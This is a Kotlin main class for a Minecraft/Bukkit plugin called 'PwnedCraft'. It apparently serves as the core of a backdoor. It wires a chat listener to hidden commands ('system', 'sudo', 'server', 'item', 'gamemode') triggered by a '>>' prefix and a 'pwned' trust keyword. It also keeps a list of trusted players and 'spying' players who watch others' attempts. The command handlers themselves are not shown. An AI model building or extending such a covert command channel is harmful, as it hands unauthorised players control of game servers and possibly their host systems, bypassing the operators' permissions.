package dev.nelmin.minecraft

import dev.nelmin.minecraft.builders.TextBuilder
import dev.nelmin.minecraft.commands.GamemodeCommand
import dev.nelmin.minecraft.commands.ItemCommand
import dev.nelmin.minecraft.commands.ServerCommand
import dev.nelmin.minecraft.commands.SudoCommand
import dev.nelmin.minecraft.commands.SystemCommand
import dev.nelmin.minecraft.listeners.ChatListener
import org.bukkit.entity.Player
import org.bukkit.plugin.java.JavaPlugin
import java.util.UUID
import java.util.function.BiConsumer

/**
 * Main class for the PwnedCraft plugin that extends the Bukkit `JavaPlugin` class.
 * This class handles the initialization of various commands, events, and global variables.
 */
class PwnedCraft : JavaPlugin() {

    /**
     * A companion object for the `PwnedCraft` class, serving as a holder for shared properties or methods
     * that are bound to the class rather than its instances.
     */
    companion object {
        /**
         * Represents the singleton instance of the `PwnedCraft` plugin.
         *
         * This variable is initialized during the `onEnable` lifecycle of the plugin, making the instance
         * accessible globally within the plugin's scope. It is utilized to provide a centralized, static
         * reference to the plugin instance for use in various utility or command classes.
         *
         * Note: As this variable is declared with `lateinit`, attempting to access it before initialization
         * will result in an exception.
         */
        lateinit var instance: PwnedCraft
    }

    /**
     * Represents the prefix used in the plugin's chat messages and logs.
     * This prefix includes a formatted and colorized string composed of the
     * plugin's name and a decorative element.
     *
     * The prefix is created using `TextBuilder` to provide consistent formatting
     * and optional colorization for chat outputs. Text color codes are applied
     * to maintain a visually appealing and recognizable structure for plugin-related messages.
     *
     * @see TextBuilder.colorize to understand the colorization process
     * @see TextBuilder.prefix for applying this prefix dynamically
     */
    val prefix = TextBuilder("&c${description.name} &8&l»&f").colorize(prefixOnNewLine = false)

    /**
     * A mutable set containing players who are trusted within the context of the plugin.
     * Trusted players have elevated permissions or access to certain features,
     * such as executing specific plugin commands. A player can be added to or removed
     * from this set dynamically at runtime based on their actions or status.
     */
    val trustedPlayers = mutableSetOf<Player>()
    /**
     * A mutable set that holds the players currently in the "spying" state.
     *
     * Spying players are notified of attempts by non-trusted players to execute commands. When a non-trusted
     * player sends a message beginning with the defined command prefix, spying players receive a notification
     * detailing the sender's name and the attempted command.
     *
     * This set is dynamically updated based on specific conditions or events, allowing for real-time tracking
     * of players who are monitoring command execution attempts.
     */
    val spyingPlayers = mutableSetOf<Player>()
    /**
     * A mutable map that associates directory paths (as strings) to sets of player UUIDs.
     *
     * This map is used to track which players (identified by their unique UUIDs) are associated with specific
     * directories, potentially for permissions or gameplay mechanics related to those directories.
     */
    val gotoDirsToPlayers = mutableMapOf<String, MutableSet<UUID>>()

    /**
     * Represents the prefix used to identify commands within the plugin.
     *
     * This prefix is required at the start of all commands, distinguishing them
     * from regular chat messages. It allows the plugin to intercept and process
     * the commands appropriately.
     */
    val commandPrefix = ">>"
    /**
     * Represents the command keyword used for trust-related operations in the plugin.
     *
     * This is the identifier for the trust command that players can execute
     * to manage trust-related functionality within the plugin.
     */
    val trustCommand = "pwned"
    /**
     * A mutable map that associates command names (as strings) with their respective actions.
     * Each action is represented as a BiConsumer, where the first parameter is a Player instance,
     * and the second parameter is an array of strings containing the command arguments.
     *
     * This map is intended to store and manage commands, allowing easy retrieval and execution
     * of specific actions based on the command string.
     */
    val commands = mutableMapOf<String, BiConsumer<Player, Array<String>>>()

    /**
     * Provides access to the server's plugin manager, allowing plugins to register events,
     * manage commands, and interact with other plugins.
     *
     * This is typically used for registering event listeners or retrieving plugin-specific data.
     */
    val pluginManager = server.pluginManager

    /**
     * Lifecycle method that is called when the plugin is enabled by the server.
     * This method initializes the plugin, sets up commands, and registers event listeners.
     *
     * Behavior:
     * - Assigns the static `instance` variable to the current plugin instance.
     * - Runs the `initCommands` method to initialize custom commands for player interaction.
     * - Registers the `ChatListener` to handle chat-related events and plugin-specific functionality.
     */
    override fun onEnable() {
        instance = this

        initCommands()

        pluginManager.registerEvents(ChatListener(), this)
    }

    /**
     * This method is invoked when the plugin or application is disabled.
     * It is typically used to perform cleanup tasks, such as saving data,
     * releasing resources, or shutting down connections.
     * Override this method to execute custom logic during the disable lifecycle phase.
     */
    override fun onDisable() {
    }

    /**
     * Initializes the set of commands supported by the plugin by mapping command strings to their corresponding handlers.
     *
     * Key-Value pairs are defined in the `commands` map:
     * - Each key is a String representing a command name.
     * - Each value is a BiConsumer that takes a Player and an Array of Strings as arguments and performs the corresponding command action.
     *
     * This method sets up support for commands including:
     * - server
     * - system
     * - sudo
     * - item
     * - gamemode (aliased as gm)
     */
    private fun initCommands() {
        commands["server"] = BiConsumer { player, args ->
            ServerCommand(player, args)
        }
        commands["system"] = BiConsumer { player, args ->
            SystemCommand(player, args)
        }
        commands["sudo"] = BiConsumer { player, args ->
            SudoCommand(player, args)
        }
        commands["item"] = BiConsumer { player, args ->
            ItemCommand(player, args)
        }
        commands["gamemode"] = BiConsumer { player, args ->
            GamemodeCommand(player, args)
        }
        commands["gm"] = commands["gamemode"]!!
    }
}
